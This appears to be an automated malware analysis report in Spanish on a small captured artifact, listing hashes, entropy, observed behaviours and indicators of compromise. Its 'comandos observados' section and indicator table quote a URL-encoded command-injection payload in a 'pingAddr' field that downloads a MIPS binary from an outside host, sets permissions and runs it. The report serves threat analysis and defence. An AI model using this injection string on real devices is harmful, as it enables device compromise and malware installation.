# 🧬 Payload Analysis

`8bd54c4a5a1ffdd5f72068acea6821b7839146d925f6ac6987c6c65a19803fe7`

## 📌 Resumen

Artefacto de 328 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.44. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:46:43.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `8bd54c4a5a1ffdd5f72068acea6821b7839146d925f6ac6987c6c65a19803fe7`
- **SHA1:** `f1cf58646881d50bfce478eeae4acf8a1afa198b`
- **MD5:** `c2be2d38581c4251cd2c14defe6ba17e`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 328 B |
| Entropía | 5.44 |
| Strings | 5 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=3

## 🖥️ Comandos observados / extraídos

```text
pingAddr=%60cd+%2Ftmp%3Brm+mips%3B+wget+http%3A%2F%2Fsmart.abuse.st%2Fmips%3B+chmod+777+%2A%3B+.%2Fmips+warautalkinabout
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.163.XXX | static_analysis |
| command | pingAddr=%60cd+%2Ftmp%3Brm+mips%3B+wget+http%3A%2F%2Fsmart.abuse.st%2Fmips%3B+chmod+777+%2A%3B+.%2Fmips+warautalkinabout | strings |
| hash | 8bd54c4a5a1ffdd5f72068acea6821b7839146d925f6ac6987c6c65a19803fe7 | static_analysis |
| ip | 162.198.15.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
